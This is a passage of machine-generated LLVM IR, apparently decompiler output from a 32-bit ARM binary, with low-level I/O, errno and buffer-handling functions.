  %v3_109a0 = load i32, i32* @r4, align 4
  store i32 %v3_109a0, i32* %stack_var_-8, align 4
  %v3_109a4 = load i32, i32* @r2, align 4
  %v4_109a4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_109a4)
  store i32 %v4_109a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_109a4, -4095
  br i1 %tmp, label %dec_label_pc_109c4, label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_109a0
  %v0_109b4 = call i32 @function_10a18()
  %v0_109b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_109b8 = sub i32 0, %v0_109b8
  %v2_109bc = inttoptr i32 %v0_109b4 to i32*
  store i32 %v1_109b8, i32* %v2_109bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109a0, %dec_label_pc_109b4
  %v0_109c4 = phi i32 [ %v4_109a4, %dec_label_pc_109a0 ], [ -1, %dec_label_pc_109b4 ]
  %v2_109c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_109c8, i32* @r4, align 4
  ret i32 %v0_109c4

; uselistorder directives
  uselistorder i32 %v4_109a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109c4, { 1, 0 }
}

define i32 @function_109cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_109cc:
  %v2_109d0 = load i32, i32* @global_var_20278, align 4
  %v3_109d4 = mul i32 %arg1, 2
  %v4_109d4 = add i32 %v2_109d0, %v3_109d4
  %v5_109d4 = inttoptr i32 %v4_109d4 to i8*
  %v6_109d4 = load i8, i8* %v5_109d4, align 1
  %v8_109d4 = zext i8 %v6_109d4 to i32
  %v1_109d8 = and i32 %v8_109d4, 32
  ret i32 %v1_109d8
}

define i32 @function_109e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_109e4:
  %v1_109ec = icmp slt i32 %arg1, 0
  br i1 %v1_109ec, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_109e4
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_109e4
  %v2_109ec = mul i32 %arg1, 2
  %v2_109f8 = load i32, i32* @global_var_20280, align 4
  %v2_109fc = add i32 %v2_109f8, %v2_109ec
  %v3_10a00 = inttoptr i32 %v2_109fc to i8*
  %v4_10a00 = load i8, i8* %v3_10a00, align 1
  %v6_10a00 = zext i8 %v4_10a00 to i32
  %v1_10a04 = add i32 %v2_109fc, 1
  %v2_10a04 = inttoptr i32 %v1_10a04 to i8*
  %v3_10a04 = load i8, i8* %v2_10a04, align 1
  %v4_10a04 = zext i8 %v3_10a04 to i32
  %v3_10a08 = mul nuw i32 %v4_10a04, 16777216
  %v4_10a0c = sdiv i32 %v3_10a08, 65536
  %v5_10a0c = or i32 %v4_10a0c, %v6_10a00
  ret i32 %v5_10a0c

; uselistorder directives
  uselistorder i32 %v2_109fc, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_10a18() local_unnamed_addr {
dec_label_pc_10a18:
  ret i32 ptrtoint (i32* @global_var_26640.223 to i32)
}

define i32 @function_10a24(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a24:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10a28 = load i32, i32* @r4, align 4
  store i32 %v3_10a28, i32* %stack_var_-20, align 4
  %v6_10a28 = load i32, i32* @r5, align 4
  %v9_10a28 = load i32, i32* @r6, align 4
  %v12_10a28 = load i32, i32* @r7, align 4
  %v2_10a2c = load i32, i32* @global_var_20288, align 4
  store i32 %v2_10a2c, i32* @r5, align 4
  %v1_10a30 = add i32 %v2_10a2c, 52
  %v2_10a30 = inttoptr i32 %v1_10a30 to i32*
  %v3_10a30 = load i32, i32* %v2_10a30, align 4
  store i32 %v3_10a30, i32* @r7, align 4
  %v2_10a34 = ptrtoint i32* %stack_var_-36 to i32
  %v1_10a38 = add i32 %v2_10a2c, 56
  store i32 %v1_10a38, i32* @r4, align 4
  %v2_10a3c = icmp eq i32 %v3_10a30, 0
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_10a34, i32* @r0, align 4
  br i1 %v2_10a3c, label %dec_label_pc_10a54, label %dec_label_pc_10a70

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a24
  %v8_10a5c = call i32 @function_13abc(i32 %v2_10a34, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 %v1_10a38, i32 80572, i32 %v3_10a28, i32 %v6_10a28, i32 %v9_10a28)
  store i32 68208, i32* @lr, align 4
  %v1_10a6c = call i32 @function_13ab4()
  %v0_10a70.pre = load i32, i32* @r5, align 4
  %v0_10a74.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a24, %dec_label_pc_10a54
  %v0_10a74 = phi i32 [ %arg1, %dec_label_pc_10a24 ], [ %v0_10a74.pre, %dec_label_pc_10a54 ]
  %v0_10a70 = phi i32 [ %v2_10a2c, %dec_label_pc_10a24 ], [ %v0_10a70.pre, %dec_label_pc_10a54 ]
  %v2_10a78 = call i32 @function_11c7c(i32 %v0_10a74, i32 %v0_10a70)
  store i32 %v2_10a78, i32* @r4, align 4
  %v7_10a80 = icmp eq i32 %v2_10a78, -1
  br i1 %v7_10a80, label %bb14, label %dec_label_pc_10a90

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a70
  %v0_10a84 = load i32, i32* @r5, align 4
  %v3_10a90 = call i32 @function_11b78(i8 10, i32 %v0_10a84)
  %v7_10a94 = icmp eq i32 %v3_10a90, -1
  br i1 %v7_10a94, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10a90
  store i32 %v3_10a90, i32* @r4, align 4
  br label %bb14

.thread:                                          ; preds = %dec_label_pc_10a90
  %v1_10a9c.pre = load i32, i32* @r4, align 4
  %phitmp = add i32 %v1_10a9c.pre, 1
  store i32 %phitmp, i32* @r4, align 4
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_10a70, %.thread
  %v0_10ab87 = phi i32 [ %v2_10a78, %dec_label_pc_10a70 ], [ %v3_10a90, %bb ], [ %phitmp, %.thread ]
  %v0_10aa0 = load i32, i32* @r7, align 4
  %v2_10aa0 = icmp eq i32 %v0_10aa0, 0
  br i1 %v2_10aa0, label %bb15, label %.thread2

bb15:                                             ; preds = %bb14
  store i32 68280, i32* @lr, align 4
  call void @__pseudo_branch(i32 80572)
  %v0_10ab8.pre = load i32, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb14, %bb15
  %v0_10ab8 = phi i32 [ %v0_10ab87, %bb14 ], [ %v0_10ab8.pre, %bb15 ]
  %v2_10ac0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10ac0, i32* @r4, align 4
  store i32 %v6_10a28, i32* @r5, align 4
  store i32 %v9_10a28, i32* @r6, align 4
  store i32 %v12_10a28, i32* @r7, align 4
  ret i32 %v0_10ab8

; uselistorder directives
  uselistorder i32 %v3_10a90, { 1, 2, 0 }
  uselistorder i32 %v2_10a78, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
}

define i32 @function_10ad8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10ad8:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  %v0_10adc = load i32, i32* @lr, align 4
  %v2_10ae8 = ptrtoint i32* %stack_var_-12 to i32
  %v2_10aec = load i32, i32* @global_var_20288, align 4
  %v10_10afc = inttoptr i32 %v2_10aec to i8*
  %v11_10afc = call i32 @function_10c7c(i8* %v10_10afc, i32 %arg1, i32 %v2_10ae8, i32 ptrtoint (i32* @global_var_20288 to i32), i32 %v2_10ae8, i32 %v0_10adc, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v0_10adc, i32* @lr, align 4
  ret i32 %v11_10afc

; uselistorder directives
  uselistorder i32 %v2_10ae8, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* @global_var_20288, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10b14() local_unnamed_addr {
dec_label_pc_10b14:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10b14 = load i32, i32* @r4, align 4
  store i32 %v3_10b14, i32* %stack_var_-24, align 4
  %v9_10b14 = load i32, i32* @r6, align 4
  %v0_10b18 = call i32 @function_10a18()
  store i32 ptrtoint (i8** @global_var_202d0.218 to i32), i32* @r4, align 4
  %v3_10b20 = load i8, i8* @global_var_202d1.232, align 1
  %v4_10b20 = zext i8 %v3_10b20 to i32
  store i32 %v4_10b20, i32* @r3, align 4
  %v2_10b24 = load i8, i8* bitcast (i8** @global_var_202d0.218 to i8*), align 4
  %v3_10b24 = zext i8 %v2_10b24 to i32
  store i32 %v0_10b18, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_10b30 = mul nuw nsw i32 %v4_10b20, 256
  %v5_10b30 = or i32 %v3_10b24, %v4_10b30
  store i32 %v5_10b30, i32* @r6, align 4
  %v1_10b34 = inttoptr i32 %v0_10b18 to i32*
  %v2_10b34 = load i32, i32* %v1_10b34, align 4
  store i32 %v2_10b34, i32* %r8.global-to-local, align 4
  %v1_10b38 = call i32 @function_1234c(i32 0)
  %v1_10b3c = sub i32 1, %v1_10b38
  %v0_10b40 = load i32, i32* @r6, align 4
  %v4_10b40 = mul i32 %v1_10b3c, 256
  %v5_10b40 = xor i32 %v4_10b40, %v0_10b40
  %v3_10b44 = load i8, i8* @global_var_20321.233, align 1
  %v4_10b44 = zext i8 %v3_10b44 to i32
  store i32 %v4_10b44, i32* @r3, align 4
  %v3_10b48 = load i8, i8* @global_var_20320.219, align 1
  %v4_10b48 = zext i8 %v3_10b48 to i32
  %v3_10b4c = sdiv i32 %v5_10b40, 256
  store i32 1, i32* @r0, align 4
  %v4_10b54 = mul nuw nsw i32 %v4_10b44, 256
  %v5_10b54 = or i32 %v4_10b48, %v4_10b54
  store i32 %v5_10b54, i32* @r5, align 4
  %v1_10b58 = trunc i32 %v3_10b4c to i8
  store i8 %v1_10b58, i8* @global_var_202d1.232, align 1
  %v1_10b5c = trunc i32 %v0_10b40 to i8
  %v2_10b5c = load i32, i32* @r4, align 4
  %v3_10b5c = inttoptr i32 %v2_10b5c to i8*
  store i8 %v1_10b5c, i8* %v3_10b5c, align 1
  %v1_10b60 = call i32 @function_1234c(i32 1)
  %v1_10b64 = sub i32 1, %v1_10b60
  %v0_10b68 = load i32, i32* @r5, align 4
  %v4_10b68 = mul i32 %v1_10b64, 256
  %v5_10b68 = xor i32 %v4_10b68, %v0_10b68
  store i32 %v5_10b68, i32* %r5.global-to-local, align 4
  %v3_10b6c = sdiv i32 %v5_10b68, 256
  %v1_10b70 = trunc i32 %v3_10b6c to i8
  store i8 %v1_10b70, i8* @global_var_20321.233, align 1
  %v0_10b74 = load i32, i32* %r8.global-to-local, align 4
  %v1_10b74 = load i32, i32* @r7, align 4
  %v2_10b74 = inttoptr i32 %v1_10b74 to i32*
  store i32 %v0_10b74, i32* %v2_10b74, align 4
  %v0_10b78 = load i32, i32* %r5.global-to-local, align 4
  %v1_10b78 = trunc i32 %v0_10b78 to i8
  store i8 %v1_10b78, i8* @global_var_20320.219, align 1
  %v2_10b7c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10b7c, i32* @r4, align 4
  store i32 %v9_10b14, i32* @r6, align 4
  ret i32 %v1_10b64

; uselistorder directives
  uselistorder i32 %v1_10b64, { 1, 0 }
  uselistorder i32 %v0_10b40, { 1, 0 }
  uselistorder i8* @global_var_20320.219, { 1, 0 }
  uselistorder i8* @global_var_20321.233, { 1, 0 }
  uselistorder i32 (i32)* @function_1234c, { 1, 0 }
  uselistorder i8* @global_var_202d1.232, { 1, 0 }
}

define i32 @function_10b84() local_unnamed_addr {
dec_label_pc_10b84:
  store i32 ptrtoint (i32* @global_var_17538.235 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_10b8c = call i32 @function_11d60()
  %v0_10b90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10b90, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10b84
  %v1_10b90 = load i32, i32* @r1, align 4
  %v2_10b90 = load i32, i32* @r8, align 4
  %v3_10b90 = load i32, i32* @r5, align 4
  %v8_10b90 = lshr i32 %v2_10b90, %v3_10b90
  %v9_10b90 = and i32 %v8_10b90, %v1_10b90
  store i32 %v9_10b90, i32* @r7, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10b84, %bb
  ret i32 %v0_10b8c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_10b94() local_unnamed_addr {
dec_label_pc_10b94:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10b94 = load i32, i32* @r4, align 4
  store i32 %v3_10b94, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2029c.237 to i32), i32* @r0, align 4
  %v0_10b9c = call i32 @function_10b84()
  store i32 ptrtoint (i32* @global_var_202b4.239 to i32), i32* @r0, align 4
  %v0_10ba4 = call i32 @function_10b84()
  store i32 ptrtoint (i32** @global_var_20298.241 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_20298.241 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_10c006 = add i32 %storemerge5, 56
  store i32 %v1_10c006, i32* @r5, align 4
  %v2_10c048 = icmp eq i32 %storemerge5, 0
  store i32 %v1_10c006, i32* %r0.global-to-local, align 4
  br i1 %v2_10c048, label %dec_label_pc_10c10, label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b94, %dec_label_pc_10bf0
  store i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32* %r3.global-to-local, align 4
  store i32 68544, i32* @lr, align 4
  %v1_10bbc = call i32 @function_13ab4()
  %v2_10bc0 = icmp eq i32 %v1_10bbc, 0
  %v0_10bc4 = load i32, i32* @r5, align 4
  store i32 %v0_10bc4, i32* @r0, align 4
  br i1 %v2_10bc0, label %dec_label_pc_10bf0, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bb4
  %v0_10bcc = load i32, i32* @r4, align 4
  %v1_10bcc = add i32 %v0_10bcc, 8
  %v2_10bcc = inttoptr i32 %v1_10bcc to i32*
  %v3_10bcc = load i32, i32* %v2_10bcc, align 4
  store i32 %v3_10bcc, i32* %r3.global-to-local, align 4
  %v3_10bd4 = inttoptr i32 %v0_10bcc to i8*
  store i8 48, i8* %v3_10bd4, align 1
  %v2_10bdc = load i32, i32* @r4, align 4
  %v3_10bdc = add i32 %v2_10bdc, 1
  %v4_10bdc = inttoptr i32 %v3_10bdc to i8*
  store i8 0, i8* %v4_10bdc, align 1
  %v0_10be0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10be0 = load i32, i32* @r4, align 4
  %v2_10be0 = add i32 %v1_10be0, 20
  %v3_10be0 = inttoptr i32 %v2_10be0 to i32*
  store i32 %v0_10be0, i32* %v3_10be0, align 4
  %v0_10be4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10be4 = load i32, i32* @r4, align 4
  %v2_10be4 = add i32 %v1_10be4, 24
  %v3_10be4 = inttoptr i32 %v2_10be4 to i32*
  store i32 %v0_10be4, i32* %v3_10be4, align 4
  %v0_10be8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10be8 = load i32, i32* @r4, align 4
  %v2_10be8 = add i32 %v1_10be8, 28
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  store i32 %v0_10be8, i32* %v3_10be8, align 4
  %v0_10bec = load i32, i32* %r3.global-to-local, align 4
  %v1_10bec = load i32, i32* @r4, align 4
  %v2_10bec = add i32 %v1_10bec, 16
  %v3_10bec = inttoptr i32 %v2_10bec to i32*
  store i32 %v0_10bec, i32* %v3_10bec, align 4
  br label %dec_label_pc_10bf0

dec_label_pc_10bf0:                               ; preds = %dec_label_pc_10bb4, %dec_label_pc_10bcc
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10bf4 = load i32, i32* @r4, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 52
  %v3_10bf4 = inttoptr i32 %v2_10bf4 to i32*
  store i32 1, i32* %v3_10bf4, align 4
  %v0_10bf8 = call i32 @function_10b84()
  store i32 %v0_10bf8, i32* %r0.global-to-local, align 4
  %v0_10bfc = load i32, i32* @r4, align 4
  %v1_10bfc = add i32 %v0_10bfc, 32
  %v2_10bfc = inttoptr i32 %v1_10bfc to i32*
  %storemerge = load i32, i32* %v2_10bfc, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_10c00 = add i32 %storemerge, 56
  store i32 %v1_10c00, i32* @r5, align 4
  %v2_10c04 = icmp eq i32 %storemerge, 0
  store i32 %v1_10c00, i32* %r0.global-to-local, align 4
  br i1 %v2_10c04, label %dec_label_pc_10c00.dec_label_pc_10c10_crit_edge, label %dec_label_pc_10bb4

dec_label_pc_10c00.dec_label_pc_10c10_crit_edge:  ; preds = %dec_label_pc_10bf0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_20298.241 to i32*), align 4
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10c00.dec_label_pc_10c10_crit_edge, %dec_label_pc_10b94
  %v11_10c3813 = phi i32 [ %v1_10c00, %dec_label_pc_10c00.dec_label_pc_10c10_crit_edge ], [ %v1_10c006, %dec_label_pc_10b94 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10c00.dec_label_pc_10c10_crit_edge ], [ 0, %dec_label_pc_10b94 ]
  store i32 ptrtoint (i32** @global_var_20298.241 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_10c304 = icmp eq i32 %storemerge12, 0
  br i1 %v2_10c304, label %dec_label_pc_10c38, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10c1c
  %v0_10c24 = phi i32 [ %storemerge1, %dec_label_pc_10c1c ], [ %storemerge12, %dec_label_pc_10c10 ]
  %v1_10c1c = inttoptr i32 %v0_10c24 to i8*
  %v2_10c1c = load i8, i8* %v1_10c1c, align 1
  %v3_10c1c = zext i8 %v2_10c1c to i32
  store i32 %v3_10c1c, i32* %r3.global-to-local, align 4
  %v1_10c20 = and i32 %v3_10c1c, 64
  store i32 %v0_10c24, i32* %r0.global-to-local, align 4
  store i32 68652, i32* @lr, align 4
  %v1_10c28 = icmp ne i32 %v1_10c20, 0
  call void @__pseudo_cond_branch(i1 %v1_10c28, i32 ptrtoint (i32* @global_var_10c4c.243 to i32))
  %v0_10c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_10c2c = add i32 %v0_10c2c, 32
  %v2_10c2c = inttoptr i32 %v1_10c2c to i32*
  %storemerge1 = load i32, i32* %v2_10c2c, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10c30 = icmp eq i32 %storemerge1, 0
  br i1 %v2_10c30, label %dec_label_pc_10c30.dec_label_pc_10c38_crit_edge, label %dec_label_pc_10c1c

dec_label_pc_10c30.dec_label_pc_10c38_crit_edge:  ; preds = %dec_label_pc_10c1c
  %v11_10c38.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c30.dec_label_pc_10c38_crit_edge, %dec_label_pc_10c10
  %v11_10c38 = phi i32 [ %v11_10c38.pre, %dec_label_pc_10c30.dec_label_pc_10c38_crit_edge ], [ %v11_10c3813, %dec_label_pc_10c10 ]
  %v2_10c38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10c38, i32* @r4, align 4
  ret i32 %v11_10c38

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i8** @global_var_202d0.218, { 1, 0, 2 }
  uselistorder i32** @global_var_20298.241, { 1, 0 }
  uselistorder i32 ()* @function_10b84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10bb4, { 1, 0 }
}

define i32 @function_10c4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c4c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c4c = load i32, i32* @r4, align 4
  store i32 %v3_10c4c, i32* %stack_var_-8, align 4
  %v1_10c50 = add i32 %arg1, 8
  %v2_10c50 = inttoptr i32 %v1_10c50 to i32*
  %v3_10c50 = load i32, i32* %v2_10c50, align 4
  %v1_10c54 = add i32 %arg1, 16
  %v2_10c54 = inttoptr i32 %v1_10c54 to i32*
  %v3_10c54 = load i32, i32* %v2_10c54, align 4
  %v2_10c58 = sub i32 %v3_10c54, %v3_10c50
  store i32 %v2_10c58, i32* @r2, align 4
  %v9_10c58 = icmp eq i32 %v3_10c54, %v3_10c50
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_10c58, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_10c4c
  store i32 %v3_10c50, i32* %v2_10c54, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_10c4c, %bb
  store i32 68716, i32* @lr, align 4
  %v1_10c68 = xor i1 %v9_10c58, true
  call void @__pseudo_cond_branch(i1 %v1_10c68, i32 ptrtoint (i32* @global_var_141d0.244 to i32))
  %v0_10c6c = load i32, i32* %r4.global-to-local, align 4
  %v1_10c6c = add i32 %v0_10c6c, 8
  %v2_10c6c = inttoptr i32 %v1_10c6c to i32*
  %v3_10c6c = load i32, i32* %v2_10c6c, align 4
  %v1_10c70 = add i32 %v0_10c6c, 16
  %v2_10c70 = inttoptr i32 %v1_10c70 to i32*
  %v3_10c70 = load i32, i32* %v2_10c70, align 4
  %v2_10c74 = sub i32 %v3_10c70, %v3_10c6c
  %v2_10c78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10c78, i32* @r4, align 4
  ret i32 %v2_10c74

; uselistorder directives
  uselistorder i32 %v3_10c54, { 1, 0 }
  uselistorder i32 %v3_10c50, { 0, 2, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_10c7c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_10c7c:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10c7c = load i32, i32* @r4, align 4
  store i32 %v3_10c7c, i32* %stack_var_-24, align 4
  %v6_10c7c = load i32, i32* @r5, align 4
  %v9_10c7c = load i32, i32* @r6, align 4
  %v12_10c7c = load i32, i32* @r7, align 4
  %v15_10c7c = load i32, i32* @r8, align 4
  %v2_10c80 = add i32 %tmp, 52
  %v3_10c80 = inttoptr i32 %v2_10c80 to i32*
  %v4_10c80 = load i32, i32* %v3_10c80, align 4
  store i32 %v4_10c80, i32* @r8, align 4
  %v2_10c84 = add i32 %tmp, 56
  store i32 %v2_10c84, i32* @r5, align 4
  %v2_10c88 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10c8c = icmp eq i32 %v4_10c80, 0
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_10c88, i32* @r0, align 4
  br i1 %v2_10c8c, label %dec_label_pc_10cac, label %dec_label_pc_10cc8

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10c7c
  %v8_10cb4 = call i32 @function_13abc(i32 %v2_10c88, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 %v2_10c84, i32 80572, i32 %v3_10c7c, i32 %v6_10c7c, i32 %v9_10c7c)
  store i32 68808, i32* @lr, align 4
  %v1_10cc4 = call i32 @function_13ab4()
  %v0_10cc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10cc8

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10c7c, %dec_label_pc_10cac
  %v0_10cd8 = phi i32 [ %tmp, %dec_label_pc_10c7c ], [ %v0_10cc8.pre, %dec_label_pc_10cac ]
  %v1_10cc8 = inttoptr i32 %v0_10cd8 to i8*
  %v2_10cc8 = load i8, i8* %v1_10cc8, align 1
  %v2_10cd0 = icmp ugt i8 %v2_10cc8, -65
  br i1 %v2_10cd0, label %dec_label_pc_10cf0, label %dec_label_pc_10ce0

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_10cc8
  %v4_10ce0 = call i32 @function_143c4(i8* %v1_10cc8, i32 128)
  %v2_10ce4 = icmp eq i32 %v4_10ce0, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_10ce4, label %dec_label_pc_10ce0.dec_label_pc_10cf0_crit_edge, label %dec_label_pc_10d04

dec_label_pc_10ce0.dec_label_pc_10cf0_crit_edge:  ; preds = %dec_label_pc_10ce0
  %v0_10cf8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10cf0

dec_label_pc_10cf0:                               ; preds = %dec_label_pc_10ce0.dec_label_pc_10cf0_crit_edge, %dec_label_pc_10cc8
  %v0_10cf8 = phi i32 [ %v0_10cf8.pre, %dec_label_pc_10ce0.dec_label_pc_10cf0_crit_edge ], [ %v0_10cd8, %dec_label_pc_10cc8 ]
  %v0_10cf0 = load i32, i32* @r7, align 4
  %v0_10cf4 = load i32, i32* @r6, align 4
  %v4_10cfc = inttoptr i32 %v0_10cf0 to i8*
  %v5_10cfc = call i32 @function_10e08(i32 %v0_10cf8, i8* %v4_10cfc, i32 %v0_10cf4)
  store i32 %v5_10cfc, i32* @r5, align 4
  br label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10ce0, %dec_label_pc_10cf0
  %v0_10d1c5 = phi i32 [ -1, %dec_label_pc_10ce0 ], [ %v5_10cfc, %dec_label_pc_10cf0 ]
  %v0_10d04 = load i32, i32* @r8, align 4
  %v2_10d04 = icmp eq i32 %v0_10d04, 0
  br i1 %v2_10d04, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10d04
  call void @__pseudo_branch(i32 80572)
  %v0_10d1c.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10d04, %bb
  %v0_10d1c = phi i32 [ %v0_10d1c5, %dec_label_pc_10d04 ], [ %v0_10d1c.pre, %bb ]
  %v2_10d24 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10d24, i32* @r4, align 4
  store i32 %v6_10c7c, i32* @r5, align 4
  store i32 %v9_10c7c, i32* @r6, align 4
  store i32 %v12_10c7c, i32* @r7, align 4
  store i32 %v15_10c7c, i32* @r8, align 4
  ret i32 %v0_10d1c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10d04, { 1, 0 }
  uselistorder label %dec_label_pc_10cc8, { 1, 0 }
}

define i32 @function_10d38(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10d38:
  %stack_var_-17 = alloca i8, align 1
  %v3_10d38 = load i32, i32* @r4, align 4
  %v6_10d38 = load i32, i32* @r5, align 4
  %v9_10d38 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_10d582 = icmp eq i32 %arg3, 0
  %v2_10d5c = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_10d582, label %dec_label_pc_10d78, label %dec_label_pc_10d6c

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d6c
  %v1_10d54 = add i32 %v0_10d54, -1
  store i32 %v1_10d54, i32* @r4, align 4
  %v2_10d58 = icmp eq i32 %v1_10d54, 0
  %v0_10d64 = load i32, i32* @r6, align 4
  br i1 %v2_10d58, label %dec_label_pc_10d78.loopexit, label %dec_label_pc_10d6c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d38, %dec_label_pc_10d54
  %v0_10d644 = phi i32 [ %v0_10d64, %dec_label_pc_10d54 ], [ %arg1, %dec_label_pc_10d38 ]
  %v3_10d6c = call i32 @function_1428c(i32 %v2_10d5c, i32 1, i32 %v0_10d644)
  %v7_10d70 = icmp eq i32 %v3_10d6c, 1
  %v0_10d54 = load i32, i32* @r4, align 4
  br i1 %v7_10d70, label %dec_label_pc_10d54, label %dec_label_pc_10d78.loopexit

dec_label_pc_10d78.loopexit:                      ; preds = %dec_label_pc_10d54, %dec_label_pc_10d6c
  %v0_10d78.ph = phi i32 [ %v0_10d54, %dec_label_pc_10d6c ], [ 0, %dec_label_pc_10d54 ]
  %v1_10d78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10d78

